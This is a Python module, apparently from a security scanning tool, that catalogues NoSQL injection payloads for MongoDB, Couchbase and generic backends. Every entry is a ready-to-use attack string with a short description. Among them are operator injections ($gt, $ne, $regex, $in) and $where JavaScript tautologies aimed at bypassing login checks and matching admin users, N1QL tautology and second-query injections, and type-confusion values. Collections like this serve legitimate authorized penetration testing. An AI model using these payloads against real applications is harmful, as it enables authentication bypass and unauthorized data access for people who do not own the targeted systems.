"""NoSQL injection payload definitions for MongoDB, Couchbase, and generic backends."""

from dataclasses import dataclass


@dataclass
class NoSQLPayload:
    database: str     # "mongodb", "couchbase", "cassandra", "generic"
    technique: str    # "operator-injection", "javascript-injection", "type-confusion"
    param_format: str # "json", "query-string", "form"
    payload: str      # the actual payload string or JSON
    description: str


def mongodb_payloads() -> list[NoSQLPayload]:
    """MongoDB operator injection payloads."""
    return [
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$gt": ""}',
            description="Greater-than empty string — bypasses equality check",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$ne": "invalid"}',
            description="Not-equal injection — matches any document where field != 'invalid'",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$gte": ""}',
            description="Greater-than-or-equal empty string bypass",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$lt": "z"}',
            description="Less-than 'z' — matches most strings alphabetically",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$lte": "z"}',
            description="Less-than-or-equal bypass for string fields",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$or": [{"a": 1}, {"b": 1}]}',
            description="Logical OR operator injection",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$nor": [{"a": "impossible_value_xyz"}]}',
            description="NOR operator — matches where field doesn't equal impossible value",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$not": {"$eq": "impossible_value_xyz"}}',
            description="NOT operator bypass",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$regex": "^admin", "$options": "i"}',
            description="Regex injection — matches usernames starting with 'admin'",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="json",
            payload='{"$regex": ".*"}',
            description="Regex wildcard — matches any non-null string value",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="javascript-injection",
            param_format="json",
            payload='{"$where": "this.username == \'admin\'"}',
            description="JavaScript $where injection targeting admin user",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="javascript-injection",
            param_format="json",
            payload='{"$where": "1 == 1"}',
            description="JavaScript $where tautology — always true",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="query-string",
            payload="[$gt]=",
            description="Query-string $gt operator (append to param name, e.g. username[$gt]=)",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="query-string",
            payload="[$ne]=invalid",
            description="Query-string $ne operator bypass",
        ),
        NoSQLPayload(
            database="mongodb",
            technique="operator-injection",
            param_format="query-string",
            payload="[$regex]=^admin",
            description="Query-string regex injection",
        ),
    ]


def couchbase_payloads() -> list[NoSQLPayload]:
    """Couchbase N1QL injection payloads."""
    return [
        NoSQLPayload(
            database="couchbase",
            technique="operator-injection",
            param_format="query-string",
            payload="' OR '1'='1",
            description="Classic N1QL tautology bypass",
        ),
        NoSQLPayload(
            database="couchbase",
            technique="operator-injection",
            param_format="query-string",
            payload="' OR meta().id LIKE '%",
            description="N1QL meta() function injection — matches all documents",
        ),
        NoSQLPayload(
            database="couchbase",
            technique="operator-injection",
            param_format="query-string",
            payload="'; SELECT * FROM `users` WHERE '1'='1",
            description="N1QL second-query injection attempt",
        ),
        NoSQLPayload(
            database="couchbase",
            technique="operator-injection",
            param_format="query-string",
            payload="' OR type='user",
            description="N1QL type field bypass",
        ),
        NoSQLPayload(
            database="couchbase",
            technique="operator-injection",
            param_format="json",
            payload='{"$or": [{"username": {"$gt": ""}}, {"password": {"$gt": ""}}]}',
            description="Couchbase operator injection via JSON body",
        ),
    ]


def generic_nosql_payloads() -> list[NoSQLPayload]:
    """Generic payloads that work across multiple NoSQL databases."""
    return [
        NoSQLPayload(
            database="generic",
            technique="type-confusion",
            param_format="json",
            payload="true",
            description="Boolean true — type confusion for string/bool comparison",
        ),
        NoSQLPayload(
            database="generic",
            technique="type-confusion",
            param_format="json",
            payload="1",
            description="Integer 1 — numeric type confusion bypass",
        ),
        NoSQLPayload(
            database="generic",
            technique="operator-injection",
            param_format="json",
            payload="{}",
            description="Empty object — matches any document with the field present",
        ),
        NoSQLPayload(
            database="generic",
            technique="operator-injection",
            param_format="json",
            payload='{"$exists": true}',
            description="Existence check — matches any document where field exists",
        ),
        NoSQLPayload(
            database="generic",
            technique="operator-injection",
            param_format="query-string",
            payload="[]=",
            description="Array bracket notation — may coerce to array type",
        ),
        NoSQLPayload(
            database="generic",
            technique="type-confusion",
            param_format="json",
            payload="null",
            description="Null injection — may match missing/null fields",
        ),
        NoSQLPayload(
            database="generic",
            technique="operator-injection",
            param_format="json",
            payload='{"$in": ["admin", "administrator", "root"]}',
            description="In-array operator — checks multiple common admin values",
        ),
    ]
